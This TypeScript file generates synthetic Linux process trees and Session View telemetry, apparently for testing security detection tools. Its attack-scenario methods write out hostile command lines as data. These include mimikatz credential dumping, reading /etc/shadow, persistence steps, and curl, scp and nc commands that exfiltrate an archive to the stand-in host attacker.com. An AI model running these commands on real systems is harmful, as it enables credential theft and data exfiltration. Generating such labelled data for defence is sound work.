import { faker } from '@faker-js/faker';
import crypto from 'crypto';

export interface ProcessEntity {
  entity_id: string;
  pid: number;
  start: string;
  name: string;
  executable: string;
  command_line: string;
  working_directory: string;
  args: string[];
  user: {
    name: string;
    id: string;
  };
  group: {
    name: string;
    id: string;
  };
  interactive: boolean;
  tty?: {
    char_device: {
      major: number;
      minor: number;
    };
  };
}

export interface SessionViewFields {
  'process.entity_id': string;
  'process.session_leader.entity_id': string;
  'process.entry_leader.entity_id': string;
  'process.group_leader.entity_id': string;
  'process.parent.entity_id'?: string;
  'process.working_directory': string;
  'process.args': string[];
  'process.interactive': boolean;
  'process.tty'?: {
    char_device: {
      major: number;
      minor: number;
    };
  };
  'process.io'?: {
    text: string;
    type: 'tty' | 'pts';
  };
  'process.session_leader.pid': number;
  'process.session_leader.start': string;
  'process.entry_leader.pid': number;
  'process.entry_leader.start': string;
  'process.group_leader.pid': number;
  'process.group_leader.start': string;
  'process.parent.pid'?: number;
  'process.parent.start'?: string;
}

export class SessionViewGenerator {
  private hostBootId: string;
  private pidNamespace: string;
  private processEntities: Map<string, ProcessEntity> = new Map();
  private sessionLeaders: ProcessEntity[] = [];
  private entryLeaders: ProcessEntity[] = [];
  private groupLeaders: ProcessEntity[] = [];

  constructor(hostName: string = faker.internet.domainName()) {
    // Generate consistent host identifiers
    this.hostBootId = crypto
      .createHash('sha256')
      .update(hostName)
      .digest('hex')
      .substring(0, 16);
    this.pidNamespace = crypto
      .createHash('sha256')
      .update(`${hostName}-pidns`)
      .digest('hex')
      .substring(0, 8);

    // Initialize system process leaders
    this.initializeSystemProcesses();
  }

  /**
   * Generate unique process entity ID using Linux Event Model formula:
   * fn(process.pid, process.start, host.pid_ns_ino, host.boot.id)
   */
  private generateEntityId(pid: number, startTime: string): string {
    const components = [
      pid.toString(),
      startTime,
      this.pidNamespace,
      this.hostBootId,
    ].join('-');

    return crypto
      .createHash('sha256')
      .update(components)
      .digest('hex')
      .substring(0, 32);
  }

  /**
   * Initialize system-level process leaders (init, kernel threads, etc.)
   */
  private initializeSystemProcesses(): void {
    const systemStartTime = new Date(
      Date.now() - faker.number.int({ min: 86400000, max: 604800000 }),
    ).toISOString();

    // Create init process (PID 1) - session and group leader
    const initProcess: ProcessEntity = {
      entity_id: this.generateEntityId(1, systemStartTime),
      pid: 1,
      start: systemStartTime,
      name: 'systemd',
      executable: '/usr/lib/systemd/systemd',
      command_line:
        '/usr/lib/systemd/systemd --switched-root --system --deserialize 18',
      working_directory: '/',
      args: [
        '/usr/lib/systemd/systemd',
        '--switched-root',
        '--system',
        '--deserialize',
        '18',
      ],
      user: { name: 'root', id: '0' },
      group: { name: 'root', id: '0' },
      interactive: false,
    };

    this.processEntities.set(initProcess.entity_id, initProcess);
    this.sessionLeaders.push(initProcess);
    this.entryLeaders.push(initProcess);
    this.groupLeaders.push(initProcess);

    // Create kernel thread processes
    const kernelThreads = [
      { pid: 2, name: 'kthreadd', cmd: '[kthreadd]' },
      { pid: 3, name: 'rcu_gp', cmd: '[rcu_gp]' },
      { pid: 4, name: 'rcu_par_gp', cmd: '[rcu_par_gp]' },
    ];

    kernelThreads.forEach((thread) => {
      const kernelProcess: ProcessEntity = {
        entity_id: this.generateEntityId(thread.pid, systemStartTime),
        pid: thread.pid,
        start: systemStartTime,
        name: thread.name,
        executable: `[${thread.name}]`,
        command_line: thread.cmd,
        working_directory: '/',
        args: [thread.cmd],
        user: { name: 'root', id: '0' },
        group: { name: 'root', id: '0' },
        interactive: false,
      };

      this.processEntities.set(kernelProcess.entity_id, kernelProcess);
    });

    // Create session leaders (login shells, SSH sessions, etc.)
    this.createSessionLeaders();
  }

  /**
   * Create realistic session leaders (login shells, SSH sessions)
   */
  private createSessionLeaders(): void {
    const sessionTypes = [
      { name: 'bash', executable: '/bin/bash', interactive: true, tty: true },
      {
        name: 'sshd',
        executable: '/usr/sbin/sshd',
        interactive: false,
        tty: false,
      },
      { name: 'login', executable: '/bin/login', interactive: true, tty: true },
      { name: 'su', executable: '/bin/su', interactive: true, tty: true },
    ];

    // Create 3-5 session leaders
    const sessionCount = faker.number.int({ min: 3, max: 5 });

    for (let i = 0; i < sessionCount; i++) {
      const sessionType = faker.helpers.arrayElement(sessionTypes);
      const sessionStartTime = new Date(
        Date.now() - faker.number.int({ min: 3600000, max: 43200000 }),
      ).toISOString();
      const sessionPid = faker.number.int({ min: 1000, max: 2000 });

      const sessionLeader: ProcessEntity = {
        entity_id: this.generateEntityId(sessionPid, sessionStartTime),
        pid: sessionPid,
        start: sessionStartTime,
        name: sessionType.name,
        executable: sessionType.executable,
        command_line: `${sessionType.executable} ${sessionType.interactive ? '-i' : ''}`,
        working_directory: sessionType.interactive
          ? `/home/${faker.internet.username()}`
          : '/',
        args: [
          sessionType.executable,
          ...(sessionType.interactive ? ['-i'] : []),
        ],
        user: {
          name: sessionType.interactive ? faker.internet.username() : 'root',
          id: sessionType.interactive
            ? faker.number.int({ min: 1000, max: 65534 }).toString()
            : '0',
        },
        group: {
          name: sessionType.interactive ? 'users' : 'root',
          id: sessionType.interactive ? '100' : '0',
        },
        interactive: sessionType.interactive,
      };

      // Add TTY information for interactive sessions
      if (sessionType.tty) {
        sessionLeader.tty = {
          char_device: {
            major: faker.number.int({ min: 4, max: 5 }), // TTY major numbers
            minor: faker.number.int({ min: 0, max: 255 }),
          },
        };
      }

      this.processEntities.set(sessionLeader.entity_id, sessionLeader);
      this.sessionLeaders.push(sessionLeader);

      // Session leaders are also entry leaders
      this.entryLeaders.push(sessionLeader);

      // Create group leader if different from session leader
      if (faker.datatype.boolean({ probability: 0.3 })) {
        this.groupLeaders.push(sessionLeader);
      }
    }
  }

  /**
   * Generate a new process with Session View fields
   */
  generateProcess(
    options: {
      name?: string;
      executable?: string;
      commandLine?: string;
      parentProcess?: ProcessEntity;
      isInteractive?: boolean;
      createNewSession?: boolean;
    } = {},
  ): ProcessEntity {
    const {
      name = faker.helpers.arrayElement([
        'bash',
        'python3',
        'node',
        'java',
        'curl',
        'wget',
        'vim',
      ]),
      executable = `/usr/bin/${name}`,
      commandLine = `${executable} ${faker.lorem.words(2)}`,
      parentProcess = this.getRandomParentProcess(),
      isInteractive = faker.datatype.boolean({ probability: 0.3 }),
      createNewSession = faker.datatype.boolean({ probability: 0.1 }),
    } = options;

    const processStartTime = new Date(
      Date.now() - faker.number.int({ min: 1000, max: 3600000 }),
    ).toISOString();
    const processPid = faker.number.int({ min: 2000, max: 65535 });

    const process: ProcessEntity = {
      entity_id: this.generateEntityId(processPid, processStartTime),
      pid: processPid,
      start: processStartTime,
      name,
      executable,
      command_line: commandLine,
      working_directory: isInteractive
        ? `/home/${faker.internet.username()}`
        : '/tmp',
      args: commandLine.split(' '),
      user: {
        name: parentProcess?.user.name || faker.internet.username(),
        id:
          parentProcess?.user.id ||
          faker.number.int({ min: 1000, max: 65534 }).toString(),
      },
      group: {
        name: parentProcess?.group.name || 'users',
        id: parentProcess?.group.id || '100',
      },
      interactive: isInteractive,
    };

    // Add TTY for interactive processes
    if (isInteractive) {
      process.tty = {
        char_device: {
          major: faker.number.int({ min: 136, max: 143 }), // PTY major numbers
          minor: faker.number.int({ min: 0, max: 255 }),
        },
      };
    }

    this.processEntities.set(process.entity_id, process);

    // Handle session creation
    if (createNewSession) {
      this.sessionLeaders.push(process);
      this.entryLeaders.push(process);
      this.groupLeaders.push(process);
    }

    return process;
  }

  /**
   * Get a random parent process (typically a shell or system process)
   */
  private getRandomParentProcess(): ProcessEntity {
    const interactiveProcesses = this.sessionLeaders.filter(
      (p) => p.interactive,
    );
    if (
      interactiveProcesses.length > 0 &&
      faker.datatype.boolean({ probability: 0.7 })
    ) {
      return faker.helpers.arrayElement(interactiveProcesses);
    }

    // Fallback to any session leader
    return faker.helpers.arrayElement(this.sessionLeaders);
  }

  /**
   * Generate Session View fields for a process
   */
  generateSessionViewFields(
    process: ProcessEntity,
    parentProcess?: ProcessEntity,
  ): SessionViewFields {
    // Select leaders for this process
    const sessionLeader = faker.helpers.arrayElement(this.sessionLeaders);
    const entryLeader = faker.helpers.arrayElement(this.entryLeaders);
    const groupLeader = faker.helpers.arrayElement(this.groupLeaders);

    const fields: SessionViewFields = {
      'process.entity_id': process.entity_id,
      'process.session_leader.entity_id': sessionLeader.entity_id,
      'process.session_leader.pid': sessionLeader.pid,
      'process.session_leader.start': sessionLeader.start,
      'process.entry_leader.entity_id': entryLeader.entity_id,
      'process.entry_leader.pid': entryLeader.pid,
      'process.entry_leader.start': entryLeader.start,
      'process.group_leader.entity_id': groupLeader.entity_id,
      'process.group_leader.pid': groupLeader.pid,
      'process.group_leader.start': groupLeader.start,
      'process.working_directory': process.working_directory,
      'process.args': process.args,
      'process.interactive': process.interactive,
    };

    // Add parent process information
    if (parentProcess) {
      fields['process.parent.entity_id'] = parentProcess.entity_id;
      fields['process.parent.pid'] = parentProcess.pid;
      fields['process.parent.start'] = parentProcess.start;
    }

    // Add TTY information for interactive processes
    if (process.tty) {
      fields['process.tty'] = process.tty;
    }

    // Add terminal output for interactive processes
    if (process.interactive && faker.datatype.boolean({ probability: 0.6 })) {
      fields['process.io'] = {
        text: this.generateTerminalOutput(process.name),
        type: process.tty ? 'pts' : 'tty',
      };
    }

    return fields;
  }

  /**
   * Generate realistic terminal output for Session View
   */
  private generateTerminalOutput(processName: string): string {
    const outputs: Record<string, string[]> = {
      bash: [
        '$ ls -la\ntotal 24\ndrwxr-xr-x 3 user user 4096 Dec 20 10:30 .\ndrwxr-xr-x 5 user user 4096 Dec 20 10:25 ..',
        '$ pwd\n/home/user',
        '$ whoami\nuser',
        '$ ps aux | grep python\nuser  12345  0.0  0.1  12345  6789 pts/0  S+ 10:30   0:00 python3 script.py',
      ],
      python3: [
        'Python 3.9.2 (default, Feb 28 2021, 17:03:44)\n[GCC 10.2.1 20210110] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> ',
        ">>> import os\n>>> os.getcwd()\n'/home/user'",
        '>>> print("Hello World")\nHello World',
      ],
      vim: [
        '~\n~\n~\n"untitled" [New File]',
        ':w script.py\n"script.py" [New] 5L, 123C written',
      ],
      curl: [
        '  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1234  100  1234    0     0   5678      0 --:--:-- --:--:-- --:--:--  5678',
      ],
      default: [
        'Process started successfully\n',
        'Executing command...\n',
        'Operation completed\n',
      ],
    };

    const processOutputs = outputs[processName] || outputs.default;
    return faker.helpers.arrayElement(processOutputs);
  }

  /**
   * Generate a complete process tree for Session View
   */
  generateProcessTree(depth: number = 3): ProcessEntity[] {
    const tree: ProcessEntity[] = [];
    const root = this.generateProcess({
      createNewSession: true,
      isInteractive: true,
    });
    tree.push(root);

    let currentParents = [root];

    for (let level = 1; level < depth; level++) {
      const nextLevel: ProcessEntity[] = [];

      for (const parent of currentParents) {
        const childCount = faker.number.int({ min: 1, max: 3 });

        for (let i = 0; i < childCount; i++) {
          const child = this.generateProcess({
            parentProcess: parent,
            isInteractive:
              level === 1
                ? faker.datatype.boolean({ probability: 0.5 })
                : false,
          });
          tree.push(child);
          nextLevel.push(child);
        }
      }

      currentParents = nextLevel;
    }

    return tree;
  }

  /**
   * Get existing session leaders
   */
  getSessionLeaders(): ProcessEntity[] {
    return [...this.sessionLeaders];
  }

  /**
   * Get all tracked process entities
   */
  getAllProcesses(): ProcessEntity[] {
    return Array.from(this.processEntities.values());
  }

  /**
   * Generate realistic attack scenario session
   */
  generateAttackScenario(
    scenarioType:
      | 'lateral_movement'
      | 'privilege_escalation'
      | 'persistence'
      | 'discovery'
      | 'data_exfiltration' = 'lateral_movement',
  ): ProcessEntity[] {
    const attackProcesses: ProcessEntity[] = [];

    switch (scenarioType) {
      case 'lateral_movement':
        return this.generateLateralMovementScenario();
      case 'privilege_escalation':
        return this.generatePrivilegeEscalationScenario();
      case 'persistence':
        return this.generatePersistenceScenario();
      case 'discovery':
        return this.generateDiscoveryScenario();
      case 'data_exfiltration':
        return this.generateDataExfiltrationScenario();
      default:
        return this.generateLateralMovementScenario();
    }
  }

  /**
   * Generate lateral movement attack chain
   */
  private generateLateralMovementScenario(): ProcessEntity[] {
    const processes: ProcessEntity[] = [];
    const baseTime = Date.now();

    // 1. Initial compromised shell
    const initialShell = this.generateProcess({
      name: 'bash',
      executable: '/bin/bash',
      commandLine: '/bin/bash -i',
      isInteractive: true,
      createNewSession: true,
    });
    processes.push(initialShell);

    // 2. Network discovery
    const netDiscovery = this.generateProcess({
      name: 'nmap',
      executable: '/usr/bin/nmap',
      commandLine: 'nmap -sn 192.168.1.0/24',
      parentProcess: initialShell,
    });
    processes.push(netDiscovery);

    // 3. Credential dumping
    const credDump = this.generateProcess({
      name: 'mimikatz',
      executable: '/tmp/mimikatz.exe',
      commandLine:
        '/tmp/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
      parentProcess: initialShell,
    });
    processes.push(credDump);

    // 4. Remote connection
    const psexec = this.generateProcess({
      name: 'psexec',
      executable: '/usr/bin/psexec',
      commandLine:
        'psexec \\\\192.168.1.100 -u administrator -p password123 cmd.exe',
      parentProcess: initialShell,
    });
    processes.push(psexec);

    // 5. Remote shell on target
    const remoteShell = this.generateProcess({
      name: 'cmd',
      executable: 'C:\\Windows\\System32\\cmd.exe',
      commandLine: 'C:\\Windows\\System32\\cmd.exe',
      isInteractive: true,
      createNewSession: true,
    });
    processes.push(remoteShell);

    return processes;
  }

  /**
   * Generate privilege escalation scenario
   */
  private generatePrivilegeEscalationScenario(): ProcessEntity[] {
    const processes: ProcessEntity[] = [];

    // 1. Low-privilege shell
    const userShell = this.generateProcess({
      name: 'bash',
      executable: '/bin/bash',
      commandLine: '/bin/bash',
      isInteractive: true,
    });
    processes.push(userShell);

    // 2. Enumeration
    const enumeration = this.generateProcess({
      name: 'linpeas',
      executable: '/tmp/linpeas.sh',
      commandLine: '/tmp/linpeas.sh',
      parentProcess: userShell,
    });
    processes.push(enumeration);

    // 3. SUID exploitation
    const suidExploit = this.generateProcess({
      name: 'find',
      executable: '/usr/bin/find',
      commandLine: 'find / -perm -4000 -type f 2>/dev/null',
      parentProcess: userShell,
    });
    processes.push(suidExploit);

    // 4. Privilege escalation
    const privesc = this.generateProcess({
      name: 'sudo',
      executable: '/usr/bin/sudo',
      commandLine: 'sudo /bin/bash',
      parentProcess: userShell,
    });
    processes.push(privesc);

    // 5. Root shell
    const rootShell = this.generateProcess({
      name: 'bash',
      executable: '/bin/bash',
      commandLine: '/bin/bash',
      isInteractive: true,
      createNewSession: true,
    });
    // Override user to root
    rootShell.user = { name: 'root', id: '0' };
    rootShell.group = { name: 'root', id: '0' };
    processes.push(rootShell);

    return processes;
  }

  /**
   * Generate persistence mechanism scenario
   */
  private generatePersistenceScenario(): ProcessEntity[] {
    const processes: ProcessEntity[] = [];

    const shell = this.generateProcess({
      name: 'bash',
      executable: '/bin/bash',
      commandLine: '/bin/bash',
      isInteractive: true,
    });
    processes.push(shell);

    // Crontab persistence
    const crontab = this.generateProcess({
      name: 'crontab',
      executable: '/usr/bin/crontab',
      commandLine: 'crontab -e',
      parentProcess: shell,
    });
    processes.push(crontab);

    // SSH key persistence
    const sshKeys = this.generateProcess({
      name: 'ssh-keygen',
      executable: '/usr/bin/ssh-keygen',
      commandLine: 'ssh-keygen -t rsa -f /home/user/.ssh/id_rsa -N ""',
      parentProcess: shell,
    });
    processes.push(sshKeys);

    // Systemd service persistence
    const systemctl = this.generateProcess({
      name: 'systemctl',
      executable: '/usr/bin/systemctl',
      commandLine: 'systemctl enable malicious.service',
      parentProcess: shell,
    });
    processes.push(systemctl);

    return processes;
  }

  /**
   * Generate discovery scenario
   */
  private generateDiscoveryScenario(): ProcessEntity[] {
    const processes: ProcessEntity[] = [];

    const shell = this.generateProcess({
      name: 'bash',
      executable: '/bin/bash',
      isInteractive: true,
    });
    processes.push(shell);

    const discoveryCommands = [
      { name: 'whoami', cmd: 'whoami' },
      { name: 'id', cmd: 'id' },
      { name: 'ps', cmd: 'ps aux' },
      { name: 'netstat', cmd: 'netstat -tulpn' },
      { name: 'ss', cmd: 'ss -tulpn' },
      { name: 'ls', cmd: 'ls -la /home' },
      { name: 'find', cmd: 'find / -name "*.conf" 2>/dev/null' },
      { name: 'cat', cmd: 'cat /etc/passwd' },
      { name: 'cat', cmd: 'cat /etc/shadow' },
      { name: 'mount', cmd: 'mount' },
    ];

    discoveryCommands.forEach((cmd) => {
      const process = this.generateProcess({
        name: cmd.name,
        executable: `/usr/bin/${cmd.name}`,
        commandLine: cmd.cmd,
        parentProcess: shell,
      });
      processes.push(process);
    });

    return processes;
  }

  /**
   * Generate data exfiltration scenario
   */
  private generateDataExfiltrationScenario(): ProcessEntity[] {
    const processes: ProcessEntity[] = [];

    const shell = this.generateProcess({
      name: 'bash',
      executable: '/bin/bash',
      isInteractive: true,
    });
    processes.push(shell);

    // Find sensitive files
    const findFiles = this.generateProcess({
      name: 'find',
      executable: '/usr/bin/find',
      commandLine:
        'find /home -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*"',
      parentProcess: shell,
    });
    processes.push(findFiles);

    // Archive data
    const tar = this.generateProcess({
      name: 'tar',
      executable: '/usr/bin/tar',
      commandLine: 'tar -czf /tmp/data.tar.gz /home/user/Documents/',
      parentProcess: shell,
    });
    processes.push(tar);

    // Exfiltrate via various methods
    const exfilMethods = [
      {
        name: 'curl',
        cmd: 'curl -X POST -F "file=@/tmp/data.tar.gz" http://attacker.com/upload',
      },
      { name: 'scp', cmd: 'scp /tmp/data.tar.gz user@attacker.com:/tmp/' },
      { name: 'nc', cmd: 'nc attacker.com 4444 < /tmp/data.tar.gz' },
    ];

    const selectedMethod = faker.helpers.arrayElement(exfilMethods);
    const exfil = this.generateProcess({
      name: selectedMethod.name,
      executable: `/usr/bin/${selectedMethod.name}`,
      commandLine: selectedMethod.cmd,
      parentProcess: shell,
    });
    processes.push(exfil);

    return processes;
  }

  /**
   * Enhanced terminal output with realistic attack progression
   */
  private generateEnhancedTerminalOutput(
    processName: string,
    scenarioType?: string,
  ): string {
    const attackOutputs: Record<string, string[]> = {
      nmap: [
        'Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-20 14:30 UTC\n' +
          'Nmap scan report for 192.168.1.1\n' +
          'Host is up (0.00050s latency).\n' +
          'Nmap scan report for 192.168.1.100\n' +
          'Host is up (0.00023s latency).\n' +
          'Nmap done: 256 IP addresses (12 hosts up) scanned in 2.5 seconds',
      ],
      mimikatz: [
        '  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51\n' +
          ' .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)\n' +
          ' ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n' +
          ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n' +
          " '## v ##'                Vincent LE TOUX ( vincent.letoux@gmail.com )\n" +
          "  '#####'                 > https://pingcastle.com / https://mysmartlogon.com   ***/\n\n" +
          'mimikatz # privilege::debug\n' +
          "Privilege '20' OK\n\n" +
          'mimikatz # sekurlsa::logonpasswords\n' +
          'Authentication Id : 0 ; 996 (00000000:000003e4)\n' +
          'Session           : Service from 0\n' +
          'User Name         : NETWORKSERVICE\n' +
          'Domain            : NT AUTHORITY\n' +
          'Logon Server      : (null)\n' +
          ' * Username : administrator\n' +
          ' * Domain   : WORKGROUP\n' +
          ' * Password : P@ssw0rd123!',
      ],
      psexec: [
        'PsExec v2.2 - Execute processes remotely\n' +
          'Copyright (C) 2001-2016 Mark Russinovich\n' +
          'Sysinternals - www.sysinternals.com\n\n' +
          'Connecting to 192.168.1.100...\n' +
          'Starting cmd on 192.168.1.100...\n' +
          'cmd started on 192.168.1.100 with process ID 2856.',
      ],
      linpeas: [
        '════════════════════════════════════╗\n' +
          '══════════════════║ LINPEAS ║══════════════════\n' +
          '════════════════════════════════════╝\n' +
          'Linux Privilege Escalation Awesome Script\n\n' +
          '[+] Checking if /etc/passwd is writable\n' +
          '[+] Checking for SUID binaries\n' +
          '/usr/bin/sudo\n' +
          '/usr/bin/passwd\n' +
          '/usr/bin/newgrp\n' +
          '/usr/bin/su\n\n' +
          '[+] Checking sudo version\n' +
          'Sudo version 1.8.21p2',
      ],
    };

    if (attackOutputs[processName]) {
      return faker.helpers.arrayElement(attackOutputs[processName]);
    }

    // Fallback to original method
    return this.generateTerminalOutput(processName);
  }
}

// Default instance for simple usage
export const defaultSessionViewGenerator = new SessionViewGenerator();

// Factory function for creating process with Session View fields
export function createProcessWithSessionView(
  options: {
    name?: string;
    executable?: string;
    commandLine?: string;
    isInteractive?: boolean;
    hostName?: string;
  } = {},
): { process: ProcessEntity; sessionViewFields: SessionViewFields } {
  const generator = options.hostName
    ? new SessionViewGenerator(options.hostName)
    : defaultSessionViewGenerator;

  const process = generator.generateProcess(options);
  const sessionViewFields = generator.generateSessionViewFields(process);

  return { process, sessionViewFields };
}
